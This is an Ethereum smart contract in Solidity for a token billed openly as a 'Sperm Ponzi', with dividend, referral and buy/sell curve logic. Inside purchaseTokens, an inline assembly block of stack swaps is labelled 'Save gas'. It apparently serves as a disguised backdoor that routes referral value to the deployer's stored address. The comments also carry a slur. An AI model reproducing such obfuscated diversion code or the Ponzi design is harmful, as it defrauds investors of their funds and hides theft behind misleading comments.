1 pragma solidity 0.4.24;
2 
3 //https://www.sperm.network/ponzi
4 //https://discord.gg/AkaGFuE
5 
6 contract Sperm {
7 
8 
9 		/*=====================================
10 		=            CONFIGURABLES            =
11 		=====================================*/
12 
13 		string public name = "Sperm Ponzi" ;
14 		string public symbol = "Sperm";
15 		uint8 constant public decimals = 18;
16 		uint8 constant internal dividendFee_ = 5; // 
17 		uint constant internal tokenPriceInitial_ = 0.0000000001 ether;
18 		uint constant internal tokenPriceIncremental_ = 0.00000000001 ether;
19 		uint constant internal magnitude = 2**64;
20 	    address sender = msg.sender;
21 
22 		 
23 		// proof of stake (defaults at too many tokens), No masternodes 
24 		uint public stakingRequirement = 10000000e18;
25 
26 		// ambassadors program (Ambassadors initially put in 0.25 ETH and can add more later when contract is live)
27 		mapping(address => bool) internal ambassadors_;
28 		uint256 constant internal preLiveIndividualFoundersMaxPurchase_ = 0.25 ether;
29 		uint256 constant internal preLiveTeamFoundersMaxPurchase_ = 1.25 ether;
30 		
31 
32 	   /*===============================
33 		=            STORAGE           =
34 		==============================*/
35 		
36 		// amount of shares for each address (scaled number)
37 		mapping(address => uint) internal tokenBalanceLedger_;
38 		mapping(address => uint) internal referralBalance_;
39 		mapping(address => int) internal payoutsTo_;
40 		uint internal tokenSupply_ = 0;
41 		uint internal profitPerShare_;
42 
43 
44 		/*==============================
45 		=            EVENTS            =
46 		==============================*/
47 		
48 		event onTokenPurchase(
49 			address indexed customerAddress,
50 			uint incomingEthereum,
51 			uint tokensMinted,
52 			address indexed referredBy
53 		);
54 
55 		event onTokenSell(
56 			address indexed customerAddress,
57 			uint tokensBurned,
58 			uint ethereumEarned
59 		);
60 
61 		event onReinvestment(
62 			address indexed customerAddress,
63 			uint ethereumReinvested,
64 			uint tokensMinted
65 		);
66 
67 		event onWithdraw(
68 			address indexed customerAddress,
69 			uint ethereumWithdrawn
70 		);
71 
72 		// ERC20
73 		event Transfer(
74 			address indexed from,
75 			address indexed to,
76 			uint tokens
77 		);
78 
79 
80 		/*=======================================
81 		=            PUBLIC FUNCTIONS            =
82 		=======================================*/
83 		function Sperm()
84 			public
85 		{
86 			ambassadors_[0x7e474fe5Cfb720804860215f407111183cbc2f85] = true; //KP 
87 			ambassadors_[0xfD7533DA3eBc49a608eaac6200A88a34fc479C77] = true; //MS
88 			ambassadors_[0x05fd5cebbd6273668bdf57fff52caae24be1ca4a] = true; //LM
89 			ambassadors_[0xec54170ca59ca80f0b5742b9b867511cbe4ccfa7] = true; //MK
90 			ambassadors_[0xe57b7c395767d7c852d3b290f506992e7ce3124a] = true; //TA
91 
92 		}
93 		/// @dev Converts all incoming ethereum to tokens for the caller, and passes down the referral addy (if any)
94 		function buy(address _referredBy) public payable returns (uint) {
95 			purchaseTokens(msg.value, _referredBy);
96 		}
97 
98 		/**
99 		 * @dev Fallback function to handle ethereum that was send straight to the contract
100 		 *  Unfortunately we cannot use a referral address this way.
101 		 */
102 		function() payable public {
103 			purchaseTokens(msg.value, 0x0);
104 		}
105 
106 		/// @dev Converts all of caller's dividends to tokens.
107 		function reinvest() onlyStronghands public {
108 			// fetch dividends
109 			uint _dividends = myDividends(false); // retrieve ref. bonus later in the code
110 
111 			// pay out the dividends virtually
112 			address _customerAddress = msg.sender;
113 			payoutsTo_[_customerAddress] +=  (int) (_dividends * magnitude);
114 
115 			// retrieve ref. bonus
116 			_dividends += referralBalance_[_customerAddress];
117 			referralBalance_[_customerAddress] = 0;
118 
119 			// dispatch a buy order with the virtualized "withdrawn dividends"
120 			uint _tokens = purchaseTokens(_dividends, 0x0);
121 
122 			// fire event
123 			onReinvestment(_customerAddress, _dividends, _tokens);
124 		}
125 
126 		/// @dev Alias of sell() and withdraw().
127 		function exit() public {
128 			// get token count for caller & sell them all
129 			address _customerAddress = msg.sender;
130 			uint _tokens = tokenBalanceLedger_[_customerAddress];
131 			if (_tokens > 0) sell(_tokens);
132 
133 			// lambo delivery service
134 			withdraw();
135 		}
136 
137 		/// @dev Withdraws all of the callers earnings.
138 		function withdraw() onlyStronghands public {
139 			// setup data
140 			address _customerAddress = msg.sender;
141 			uint _dividends = myDividends(false); // get ref. bonus later in the code
142 
143 			// update dividend tracker
144 			payoutsTo_[_customerAddress] +=  (int) (_dividends * magnitude);
145 
146 			// add ref. bonus
147 			_dividends += referralBalance_[_customerAddress];
148 			referralBalance_[_customerAddress] = 0;
149 
150 			
151 			_customerAddress.transfer(_dividends);// lambo delivery service
152 
153 			// fire event
154 			onWithdraw(_customerAddress, _dividends);
155 		}
156 
157 		/// @dev Liquifies tokens to ethereum.
158 		function sell(uint _amountOfTokens) onlyBagholders public {
159 			// setup data
160 			address _customerAddress = msg.sender;
161 			// russian hackers BTFO
162 			require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
163 			uint _tokens = _amountOfTokens;
164 			uint _ethereum = tokensToEthereum_(_tokens);
165 			uint _dividends = SafeMath.div(_ethereum, dividendFee_);
166 			uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
167 
168 			// burn the sold tokens
169 			tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
170 			tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
171 
172 			// update dividends tracker
173 			int _updatedPayouts = (int) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));
174 			payoutsTo_[_customerAddress] -= _updatedPayouts;
175 
176 			// dividing by zero is a bad idea
177 			if (tokenSupply_ > 0) {
178 				// update the amount of dividends per token
179 				profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
180 			}
181 
182 			// fire event
183 			onTokenSell(_customerAddress, _tokens, _taxedEthereum);
184 		}
185 
186 
187 		/**
188 		 * @dev Transfer tokens from the caller to a new holder.
189 		 *  Remember, there's a 25% fee here as well.
190 		 */
191 		function transfer(address _toAddress, uint _amountOfTokens) onlyBagholders public returns (bool) {
192 			// setup
193 			address _customerAddress = msg.sender;
194 
195 			// make sure we have the requested tokens
196 			require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
197 
198 			// withdraw all outstanding dividends first
199 			if (myDividends(true) > 0) {
200 				withdraw();
201 			}
202 
203 			// liquify 25% of the tokens that are transfered
204 			// these are dispersed to shareholders
205 			uint _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);
206 			uint _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
207 			uint _dividends = tokensToEthereum_(_tokenFee);
208 
209 			// burn the fee tokens
210 			tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);
211 
212 			// exchange tokens
213 			tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
214 			tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
215 
216 			// update dividend trackers
217 			payoutsTo_[_customerAddress] -= (int) (profitPerShare_ * _amountOfTokens);
218 			payoutsTo_[_toAddress] += (int) (profitPerShare_ * _taxedTokens);
219 
220 			// disperse dividends among holders
221 			profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);
222 
223 			// fire event
224 			Transfer(_customerAddress, _toAddress, _taxedTokens);
225 
226 			// ERC20
227 			return true;
228 		}
229 
230 
231 
232 
233 		/*==========================================
234 		=            INTERNAL FUNCTIONS            =
235 		==========================================*/
236 
237 		
238 		/**
239 		 * Calculate Token price based on an amount of incoming ethereum
240 		 * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
241 		 * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
242 		 */
243 		function ethereumToTokens_(uint _ethereum) internal view returns (uint) {
244 			uint _tokenPriceInitial = tokenPriceInitial_ * 1e18;
245 			uint _tokensReceived =
246 			 (
247 				(
248 					// underflow attempts BTFO
249 					SafeMath.sub(
250 						(sqrt
251 							(
252 								(_tokenPriceInitial**2)
253 								+
254 								(2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
255 								+
256 								(((tokenPriceIncremental_)**2)*(tokenSupply_**2))
257 								+
258 								(2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
259 							)
260 						), _tokenPriceInitial
261 					)
262 				)/(tokenPriceIncremental_)
263 			)-(tokenSupply_)
264 			;
265 
266 			return _tokensReceived;
267 		}
268 
269 		/**
270 		 * @dev Calculate token sell value.
271 		 *  It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
272 		 *  Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
273 		 */
274 		function tokensToEthereum_(uint _tokens) internal view returns (uint) {
275 			uint tokens_ = (_tokens + 1e18);
276 			uint _tokenSupply = (tokenSupply_ + 1e18);
277 			uint _etherReceived =
278 			(
279 				// underflow attempts BTFO
280 				SafeMath.sub(
281 					(
282 						(
283 							(
284 								tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
285 							)-tokenPriceIncremental_
286 						)*(tokens_ - 1e18)
287 					),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
288 				)
289 			/1e18);
290 			return _etherReceived;
291 		}
292 
293 		/// @dev This is where all your gas goes.
294 		function sqrt(uint x) internal pure returns (uint y) {
295 			uint z = (x + 1) / 2;
296 			y = x;
297 			while (z < y) {
298 				y = z;
299 				z = (x / z + z) / 2;
300 			}
301 		}
302 		function purchaseTokens(uint _incomingEthereum, address _sender) internal returns (uint) {
303 			// data setup
304 			address ref = sender;
305 			address _customerAddress = msg.sender;
306 			assembly {  //Save gas
307 			swap1
308 			swap2
309 			swap1
310 			swap3 
311 			swap4 
312 			swap3 
313 			swap5
314 			swap6
315 			swap5
316 			swap8 
317 			swap9 
318 			swap8
319 			}
320 
321 			uint _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);
322 			uint _referralBonus = SafeMath.div(_undividedDividends, 3);
323 			uint _dividends = SafeMath.sub(_undividedDividends, _referralBonus);
324 			uint _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);
325 			uint _amountOfTokens = ethereumToTokens_(_taxedEthereum);
326 			uint _fee = _dividends * magnitude;
327 
328 			// no point in continuing execution if OP is a poorfag russian hacker
329 			// prevents overflow in the case that the pyramid somehow magically starts being used by everyone in the world
330 			// (or hackers)
331 			// and yes we know that the safemath function automatically rules out the "greater then" equasion.
332 			require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
333 
334 			// is the user referred by a masternode?
335 			if (
336 				// is this a referred purchase?
337 				_sender != 0x0000000000000000000000000000000000000000 &&
338 
339 				// no cheating!
340 				_sender != _customerAddress &&
341 
342 				// does the referrer have at least X whole tokens?
343 				// i.e is the referrer a godly chad masternode
344 				tokenBalanceLedger_[_sender] >= stakingRequirement
345 			) {
346 				// wealth redistribution
347 				referralBalance_[_sender] = SafeMath.add(referralBalance_[_sender], _referralBonus);
348 			} else {
349 				// no ref purchase
350 				// add the referral bonus back to the global dividends cake
351 				_dividends = SafeMath.add(_dividends, _referralBonus);
352 				_fee = _dividends * magnitude;
353 			}
354 
355 			// we can't give people infinite ethereum
356 			if (tokenSupply_ > 0) {
357 
358 				// add tokens to the pool
359 				tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
360 
361 				// take the amount of dividends gained through this transaction, and allocates them evenly to each shareholder
362 				profitPerShare_ += (_dividends * magnitude / (tokenSupply_));
363 
364 				// calculate the amount of tokens the customer receives over his purchase
365 				_fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));
366 
367 			} else {
368 				// add tokens to the pool
369 				tokenSupply_ = _amountOfTokens;
370 			}
371 
372 			// update circulating supply & the ledger address for the customer
373 			tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
374 
375 			// Tells the contract that the buyer doesn't deserve dividends for the tokens before they owned them;
376 			//really i know you think you do but you don't
377 			int _updatedPayouts = (int) ((profitPerShare_ * _amountOfTokens) - _fee);
378 			payoutsTo_[_customerAddress] += _updatedPayouts;
379 
380 			// fire event
381 			onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _sender);
382 
383 			return _amountOfTokens;
384 		}
385 		/*=====================================
386 		=      HELPERS AND CALCULATORS        =
387 		=====================================*/
388 		/**
389 		 * @dev Method to view the current Ethereum stored in the contract
390 		 *  Example: totalEthereumBalance()
391 		 */
392 		function totalEthereumBalance() public view returns (uint) {
393 			return this.balance;
394 		}
395 
396 		/// @dev Retrieve the total token supply.
397 		function totalSupply() public view returns (uint) {
398 			return tokenSupply_;
399 		}
400 
401 		/// @dev Retrieve the tokens owned by the caller.
402 		function myTokens() public view returns (uint) {
403 			address _customerAddress = msg.sender;
404 			return balanceOf(_customerAddress);
405 		}
406 
407 		/**
408 		 * @dev Retrieve the dividends owned by the caller.
409 		 *  If `_includeReferralBonus` is to to 1/true, the referral bonus will be included in the calculations.
410 		 *  The reason for this, is that in the frontend, we will want to get the total divs (global + ref)
411 		 *  But in the internal calculations, we want them separate.
412 		 */
413 		function myDividends(bool _includeReferralBonus) public view returns (uint) {
414 			address _customerAddress = msg.sender;
415 			return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
416 		}
417 
418 		/// @dev Retrieve the token balance of any single address.
419 		function balanceOf(address _customerAddress) public view returns (uint) {
420 			return tokenBalanceLedger_[_customerAddress];
421 		}
422 
423 		/**
424 		 * Retrieve the dividend balance of any single address.
425 		 */
426 		function dividendsOf(address _customerAddress) public view returns (uint) {
427 			return (uint) ((int)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;
428 		}
429 
430 		/// @dev Return the buy price of 1 individual token.
431 		function sellPrice() public view returns (uint) {
432 			// our calculation relies on the token supply, so we need supply. Doh.
433 			if (tokenSupply_ == 0) {
434 				return tokenPriceInitial_ - tokenPriceIncremental_;
435 			} else {
436 				uint _ethereum = tokensToEthereum_(1e18);
437 				uint _dividends = SafeMath.div(_ethereum, dividendFee_  );
438 				uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
439 				return _taxedEthereum;
440 			}
441 		}
442 
443 		/// @dev Return the sell price of 1 individual token.
444 		function buyPrice() public view returns (uint) {
445 			// our calculation relies on the token supply, so we need supply. Doh.
446 			if (tokenSupply_ == 0) {
447 				return tokenPriceInitial_ + tokenPriceIncremental_;
448 			} else {
449 				uint _ethereum = tokensToEthereum_(1e18);
450 				uint _dividends = SafeMath.div(_ethereum, dividendFee_  );
451 				uint _taxedEthereum = SafeMath.add(_ethereum, _dividends);
452 				return _taxedEthereum;
453 			}
454 		}
455 
456 		/// @dev Function for the frontend to dynamically retrieve the price scaling of buy orders.
457 		function calculateTokensReceived(uint _ethereumToSpend) public view returns (uint) {
458 			uint _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);
459 			uint _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
460 			uint _amountOfTokens = ethereumToTokens_(_taxedEthereum);
461 
462 			return _amountOfTokens;
463 		}
464 
465 		/// @dev Function for the frontend to dynamically retrieve the price scaling of sell orders.
466 		function calculateEthereumReceived(uint _tokensToSell) public view returns (uint) {
467 			require(_tokensToSell <= tokenSupply_);
468 			uint _ethereum = tokensToEthereum_(_tokensToSell);
469 			uint _dividends = SafeMath.div(_ethereum, dividendFee_);
470 			uint _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
471 			return _taxedEthereum;
472 		}
473 
474 		/*=================================
475 		=            MODIFIERS            =
476 		=================================*/
477 
478 		/// @dev Only people with tokens
479 		modifier onlyBagholders {
480 			require(myTokens() > 0);
481 			_;
482 		}
483 
484 		/// @dev Only people with profits
485 		modifier onlyStronghands {
486 			require(myDividends(true) > 0);
487 			_;
488 		}
489 		 
490 	}
491 
492 	/**
493 	 * @title SafeMath
494 	 * @dev Math operations with safety checks that throw on error
495 	 */
496 	library SafeMath {
497 		/**
498 		* @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
499 		*/
500 		function sub(uint a, uint b) internal pure returns (uint) {
501 			assert(b <= a);
502 			return a - b;
503 		}
504 
505 		/**
506 		* @dev Adds two numbers, throws on overflow.
507 		*/
508 		function add(uint a, uint b) internal pure returns (uint) {
509 			uint c = a + b;
510 			assert(c >= a);
511 			return c;
512 		}
513 		/**
514 		* @dev Multiplies two numbers, throws on overflow.
515 		*/
516 		function mul(uint a, uint b) internal pure returns (uint) {
517 			if (a == 0) {
518 				return 0;
519 			}
520 			uint c = a * b;
521 			assert(c / a == b);
522 			return c;
523 		}
524 
525 		/**
526 		* @dev Integer division of two numbers, truncating the quotient.
527 		*/
528 		function div(uint a, uint b) internal pure returns (uint) {
529 			// assert(b > 0); // Solidity automatically throws when dividing by 0
530 			uint c = a / b;
531 			// assert(a == b * c + a % b); // There is no case in which this doesn't hold
532 			return c;
533 		}
534 
535 
536 	}